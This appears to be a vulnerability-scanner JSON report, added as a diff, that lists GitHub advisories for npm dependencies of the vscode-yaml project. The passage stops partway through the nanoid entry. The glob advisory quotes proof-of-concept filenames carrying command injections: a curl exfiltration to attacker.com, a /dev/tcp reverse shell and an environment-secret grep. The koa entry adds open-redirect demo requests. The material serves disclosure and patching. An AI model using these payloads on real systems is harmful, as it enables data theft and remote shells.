@@ -1,0 +1,1594 @@
+{
+  "results": [
+    {
+      "source": {
+        "path": "/sboms/redhat-developer__vscode-yaml.spdx.json",
+        "type": "sbom"
+      },
+      "packages": [
+        {
+          "package": {
+            "name": "form-data",
+            "version": "4.0.3",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-fjxv-7rqg-78g4"
+              ],
+              "aliases": [
+                "CVE-2025-7783",
+                "GHSA-fjxv-7rqg-78g4"
+              ],
+              "max_severity": "9.4"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "2.5.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0"
+                        },
+                        {
+                          "fixed": "3.0.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-fjxv-7rqg-78g4/GHSA-fjxv-7rqg-78g4.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "form-data",
+                    "purl": "pkg:npm/form-data"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.0.4"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-7783"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-330"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-07-21T19:04:54Z",
+                "nvd_published_at": "2025-07-18T17:15:44Z",
+                "severity": "CRITICAL"
+              },
+              "details": "### Summary\n\nform-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker:\n1. can observe other values produced by Math.random in the target application, and\n2. can control one field of a request made using form-data\n\nBecause the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request.\n\nThis is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work.\n\n### Details\n\nThe culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347\n\nAn attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22))\n\n### PoC\n\nPoC here: https://github.com/benweissmann/CVE-2025-7783-poc\n\nInstructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). \n\n### Impact\n\nFor an application to be vulnerable, it must:\n- Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array)\n- Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. \n\nIf an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",
+              "id": "GHSA-fjxv-7rqg-78g4",
+              "modified": "2025-11-03T21:34:08Z",
+              "published": "2025-07-21T19:04:54Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/form-data/form-data/security/advisories/GHSA-fjxv-7rqg-78g4"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-7783"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/form-data/form-data/commit/3d1723080e6577a66f17f163ecd345a21d8d0fd0"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/benweissmann/CVE-2025-7783-poc"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/form-data/form-data"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://lists.debian.org/debian-lts-announce/2025/07/msg00023.html"
+                }
+              ],
+              "related": [
+                "CGA-35hh-78jw-8mmq",
+                "CGA-9m6x-qcrx-9xfj",
+                "CGA-cvhq-qgx3-vfx9",
+                "CGA-g2fp-rgfq-2hjj",
+                "CGA-h6v7-23w8-2vw8",
+                "CGA-mp9r-pq3p-q3qc",
+                "CGA-pgwm-362h-3mjh",
+                "CGA-qvfw-fcfj-g5xq",
+                "CGA-rvcj-gcgm-25q3",
+                "CGA-xvgg-cqm9-vxh5",
+                "CVE-2025-7783"
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "form-data uses unsafe random function in form-data for choosing boundary"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "glob",
+            "version": "10.4.5",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-5j98-mcp5-4vw2"
+              ],
+              "aliases": [
+                "CVE-2025-64756",
+                "GHSA-5j98-mcp5-4vw2"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-5j98-mcp5-4vw2/GHSA-5j98-mcp5-4vw2.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "glob",
+                    "purl": "pkg:npm/glob"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "11.0.0"
+                        },
+                        {
+                          "fixed": "11.1.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-5j98-mcp5-4vw2/GHSA-5j98-mcp5-4vw2.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "glob",
+                    "purl": "pkg:npm/glob"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "10.2.0"
+                        },
+                        {
+                          "fixed": "10.5.0"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-64756"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-78"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-17T17:38:56Z",
+                "nvd_published_at": "2025-11-17T18:15:58Z",
+                "severity": "HIGH"
+              },
+              "details": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c \u003ccommand\u003e \u003cpatterns\u003e` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () =\u003e foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c \u003ccommand\u003e \u003cpattern\u003e` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `\u0026`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory \u0026\u0026 cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" \u003e /dev/null 2\u003e\u00261)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" \u003e /dev/null 2\u003e\u00261)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i \u003e\u0026 /dev/tcp/attacker.com/4444 0\u003e\u00261)\ntouch '$(bash -i \u003e\u0026 /dev/tcp/attacker.com/4444 0\u003e\u00261)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" \u003e /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" \u003e /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.",
+              "id": "GHSA-5j98-mcp5-4vw2",
+              "modified": "2025-11-19T02:30:52Z",
+              "published": "2025-11-17T17:38:56Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64756"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/isaacs/node-glob"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "glob CLI: Command injection via -c/--cmd executes matches with shell:true"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "js-yaml",
+            "version": "4.1.0",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-mh29-5h37-fv8m"
+              ],
+              "aliases": [
+                "CVE-2025-64718",
+                "GHSA-mh29-5h37-fv8m"
+              ],
+              "max_severity": "5.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-mh29-5h37-fv8m/GHSA-mh29-5h37-fv8m.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "js-yaml",
+                    "purl": "pkg:npm/js-yaml"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.1.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/11/GHSA-mh29-5h37-fv8m/GHSA-mh29-5h37-fv8m.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "js-yaml",
+                    "purl": "pkg:npm/js-yaml"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.14.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-64718"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-1321"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-11-14T14:29:48Z",
+                "nvd_published_at": "2025-11-13T16:15:57Z",
+                "severity": "MODERATE"
+              },
+              "details": "### Impact\n\nIn js-yaml 4.1.0, 4.0.0, and 3.14.1 and below, it's possible for an attacker to modify the prototype of the result of a parsed yaml document via prototype pollution (`__proto__`). All users who parse untrusted yaml documents may be impacted.\n\n### Patches\n\nProblem is patched in js-yaml 4.1.1 and 3.14.2.\n\n### Workarounds\n\nYou can protect against this kind of attack on the server by using `node --disable-proto=delete` or `deno` (in Deno, pollution protection is on by default).\n\n### References\n\nhttps://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html",
+              "id": "GHSA-mh29-5h37-fv8m",
+              "modified": "2025-11-17T15:20:43Z",
+              "published": "2025-11-14T14:29:48Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-mh29-5h37-fv8m"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-64718"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/commit/383665ff4248ec2192d1274e934462bb30426879"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/nodeca/js-yaml/commit/5278870a17454fe8621dbd8c445c412529525266"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/nodeca/js-yaml"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "js-yaml has prototype pollution in merge (\u003c\u003c)"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "jws",
+            "version": "3.2.2",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-869p-cjfg-cm3x"
+              ],
+              "aliases": [
+                "CVE-2025-65945",
+                "GHSA-869p-cjfg-cm3x"
+              ],
+              "max_severity": "7.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-869p-cjfg-cm3x/GHSA-869p-cjfg-cm3x.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "jws",
+                    "purl": "pkg:npm/jws"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.2.3"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-869p-cjfg-cm3x/GHSA-869p-cjfg-cm3x.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "jws",
+                    "purl": "pkg:npm/jws"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "4.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ],
+                  "versions": [
+                    "4.0.0"
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-65945"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-347"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-12-04T16:54:15Z",
+                "nvd_published_at": "2025-12-04T19:16:05Z",
+                "severity": "HIGH"
+              },
+              "details": "### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1. Application uses the auth0/node-jws implementation of JSON Web Signatures, versions \u003c=3.2.2 || 4.0.0\n2. Application uses the jws.createVerify() function for HMAC algorithms\n3. Application uses user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\nYou are NOT affected by this vulnerability if you meet any of the following preconditions:\n1. Application uses the jws.verify() interface (note: `auth0/node-jsonwebtoken` users fall into this category and are therefore NOT affected by this vulnerability)\n2. Application uses only asymmetric algorithms (e.g. RS256)\n3. Application doesn’t use user-provided data from the JSON Web Signature Protected Header or Payload in the HMAC secret lookup routines\n\n### Fix\nUpgrade auth0/node-jws version to version 3.2.3 or 4.0.1\n\n### Acknowledgement\nOkta would like to thank Félix Charette for discovering this vulnerability.",
+              "id": "GHSA-869p-cjfg-cm3x",
+              "modified": "2025-12-05T12:36:54.291980Z",
+              "published": "2025-12-04T16:54:15Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/security/advisories/GHSA-869p-cjfg-cm3x"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-65945"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/commit/34c45b2c04434f925b638de6a061de9339c0ea2e"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/commit/4f6e73f24df42f07d632dec6431ade8eda8d11a6"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/auth0/node-jws"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/releases/tag/v3.2.3"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/auth0/node-jws/releases/tag/v4.0.1"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+                  "type": "CVSS_V3"
+                }
+              ],
+              "summary": "auth0/node-jws Improperly Verifies HMAC Signature"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "koa",
+            "version": "2.16.1",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-jgmv-j7ww-jx2x"
+              ],
+              "aliases": [
+                "CVE-2025-8129",
+                "GHSA-jgmv-j7ww-jx2x"
+              ],
+              "max_severity": "3.5"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-jgmv-j7ww-jx2x/GHSA-jgmv-j7ww-jx2x.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "koa",
+                    "purl": "pkg:npm/koa"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "2.0.0"
+                        },
+                        {
+                          "fixed": "2.16.2"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/07/GHSA-jgmv-j7ww-jx2x/GHSA-jgmv-j7ww-jx2x.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "koa",
+                    "purl": "pkg:npm/koa"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "3.0.0-alpha.0"
+                        },
+                        {
+                          "fixed": "3.0.1"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2025-8129"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-601"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2025-07-29T19:11:25Z",
+                "nvd_published_at": "2025-07-29T17:15:33Z",
+                "severity": "LOW"
+              },
+              "details": "## Summary\nIn the latest version of Koa, the back method used for redirect operations adopts an insecure implementation, which uses the user-controllable referrer header as the redirect target.\n\n## Details\non the API document https://www.koajs.net/api/response#responseredirecturl-alt, we can see:\n\n**response.redirect(url, [alt])**\n```\nPerforms a [302] redirect to url.\nThe string \"back\" is specially provided for Referrer support, using alt or \"/\" when Referrer does not exist.\n\nctx.redirect('back');\nctx.redirect('back', '/index.html');\nctx.redirect('/login');\nctx.redirect('http://google.com');\n\n```\nhowever, the \"back\" method is insecure:\n\n- https://github.com/koajs/koa/blob/master/lib/response.js#L322\n```\n  back (alt) {\n    const url = this.ctx.get('Referrer') || alt || '/'\n    this.redirect(url)\n  },\n```\nReferrer Header is User-Controlled.\n\n\n## PoC\n\n**there is a demo for POC:**\n```\nconst Koa = require('koa')\nconst serve = require('koa-static')\nconst Router = require('@koa/router')\nconst path = require('path')\n\nconst app = new Koa()\nconst router = new Router()\n\n// Serve static files from the public directory\napp.use(serve(path.join(__dirname, 'public')))\n\n// Define routes\nrouter.get('/test', ctx =\u003e {\n  ctx.redirect('back', '/index1.html')\n})\n\nrouter.get('/test2', ctx =\u003e {\n  ctx.redirect('back')\n})\n\nrouter.get('/', ctx =\u003e {\n  ctx.body = 'Welcome to the home page! Try accessing /test, /test2'\n})\n\napp.use(router.routes())\napp.use(router.allowedMethods())\n\nconst port = 3000\napp.listen(port, () =\u003e {\n  console.log(`Server running at http://localhost:${port}`)\n}) \n```\n**Proof Of Concept**\n```\nGET /test HTTP/1.1\nHost: 127.0.0.1:3000\nReferer: http://www.baidu.com\nConnection: close\n\n\nGET /test2 HTTP/1.1\nHost: 127.0.0.1:3000\nReferer: http://www.baidu.com\nConnection: close\n```\n![image](https://github.com/user-attachments/assets/03d1e61b-df97-4b42-a0c4-437bd17144db)\n\n![image](https://github.com/user-attachments/assets/f4e076e0-3853-4b7a-b4c0-bddf5b67631a)\n\n\n## Impact\nhttps://learn.snyk.io/lesson/open-redirect/",
+              "id": "GHSA-jgmv-j7ww-jx2x",
+              "modified": "2025-07-30T14:14:46Z",
+              "published": "2025-07-29T19:11:25Z",
+              "references": [
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/security/advisories/GHSA-jgmv-j7ww-jx2x"
+                },
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-54420"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/issues/1892"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/issues/1892#issue-3213028583"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/koajs/koa/commit/422c551c63d00f24e2bbbdf492f262a5935bb1f0"
+                },
+                {
+                  "type": "PACKAGE",
+                  "url": "https://github.com/koajs/koa"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://vuldb.com/?ctiid.317514"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://vuldb.com/?id.317514"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://vuldb.com/?submit.619741"
+                }
+              ],
+              "schema_version": "1.7.3",
+              "severity": [
+                {
+                  "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N",
+                  "type": "CVSS_V3"
+                },
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "Koa Open Redirect via Referrer Header (User-Controlled)"
+            }
+          ]
+        },
+        {
+          "package": {
+            "name": "nanoid",
+            "version": "3.3.1",
+            "ecosystem": "npm"
+          },
+          "groups": [
+            {
+              "ids": [
+                "GHSA-mwcw-c2x4-8c55"
+              ],
+              "aliases": [
+                "CVE-2024-55565",
+                "GHSA-mwcw-c2x4-8c55"
+              ],
+              "max_severity": "4.3"
+            }
+          ],
+          "vulnerabilities": [
+            {
+              "affected": [
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-mwcw-c2x4-8c55/GHSA-mwcw-c2x4-8c55.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "nanoid",
+                    "purl": "pkg:npm/nanoid"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "4.0.0"
+                        },
+                        {
+                          "fixed": "5.0.9"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                },
+                {
+                  "database_specific": {
+                    "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/12/GHSA-mwcw-c2x4-8c55/GHSA-mwcw-c2x4-8c55.json"
+                  },
+                  "package": {
+                    "ecosystem": "npm",
+                    "name": "nanoid",
+                    "purl": "pkg:npm/nanoid"
+                  },
+                  "ranges": [
+                    {
+                      "events": [
+                        {
+                          "introduced": "0"
+                        },
+                        {
+                          "fixed": "3.3.8"
+                        }
+                      ],
+                      "type": "SEMVER"
+                    }
+                  ]
+                }
+              ],
+              "aliases": [
+                "CVE-2024-55565"
+              ],
+              "database_specific": {
+                "cwe_ids": [
+                  "CWE-835"
+                ],
+                "github_reviewed": true,
+                "github_reviewed_at": "2024-12-09T22:42:43Z",
+                "nvd_published_at": "2024-12-09T02:15:19Z",
+                "severity": "MODERATE"
+              },
+              "details": "When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed.",
+              "id": "GHSA-mwcw-c2x4-8c55",
+              "modified": "2025-11-04T16:54:54Z",
+              "published": "2024-12-09T03:30:59Z",
+              "references": [
+                {
+                  "type": "ADVISORY",
+                  "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-55565"
+                },
+                {
+                  "type": "WEB",
+                  "url": "https://github.com/ai/nanoid/pull/510"
+                },
+                {
